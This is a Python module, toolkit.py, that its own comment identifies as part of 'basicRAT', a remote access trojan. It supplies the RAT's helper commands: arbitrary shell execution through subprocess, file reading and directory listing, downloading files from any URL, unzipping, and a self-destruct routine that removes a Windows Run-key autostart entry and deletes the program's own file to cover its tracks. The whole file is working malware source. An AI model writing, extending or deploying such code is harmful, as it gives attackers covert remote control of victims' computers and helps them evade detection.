# -*- coding: utf-8 -*-
# @Title   : 
# @Time    : 2018/7/16 9:37
# @Author  : Xifeng2009
# @Email   : 834935292@qq.com
# @File    : toolkit.py
# @Software: PyCharm

import os, sys
import datetime, time
import requests, urllib.request
import subprocess
import zipfile

def cat(file_path):
    if os.path.isfile(file_path):
        try:
            with open(file_path) as f:
                return f.read(4000)
        except IOError:
            return "Error: Permission Denied."
    else:
        return "Error: File not Found."

def execute(command):
    output = subprocess.Popen(
        command, shell=True, stdout=subprocess.PIPE,
        stderr=subprocess.PIPE, stdin=subprocess.PIPE,
    )
    return output.stdout.read() + output.stderr.read()

def ls(path):
    if not path:
        path = '.'
    if os.path.exists(path):
        try:
            return "\n".join(os.listdir(path))
        except OSError:
            return "Error: Permission Denied."
    else:
        return "Error: Path not Found."

def pwd():
    return os.getcwd()

def selfdestruct(plat):
    if plat == 'win':
        import _winreg
        from _winreg import HKEY_CURRENT_USER as HKCU

        run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(reg_key, 'br')
            _winreg.CloseKey(reg_key)
        except WindowsError:
            pass
    elif plat == 'nix':
        pass # TODO
    elif plat == 'mac':
        pass # TODO

    # Self Delete basicRAT
    os.remove(sys.argv[0])
    sys.exit(0)

def unzip(f):
    if os.path.isfile(f):
        try:
            with zipfile.ZipFile(f) as zf:
                zf.extractall('.')
                return "File () Extracted.".format(f)
        except zipfile.BadZipFile:
            return "Error: Failed to Unzip File."
    else:
        return "Error: File not Found."

def wget(url):
    if not url.startswith('http'):
        return "Error: URL must Begin with [http://] or [https://] ."
    fname = url.split('/')[-1]
    if not fname:
        dt = str(datetime.datetime.now()).replace(' ', '-').replace(':', '-')
        fname = 'file-{}'.format(dt)
    try:
        urllib.request.urlretrieve(url, fname)
    except IOError:
        return "Error: Download Failed."

    return "File {} Downloaded.".format(fname)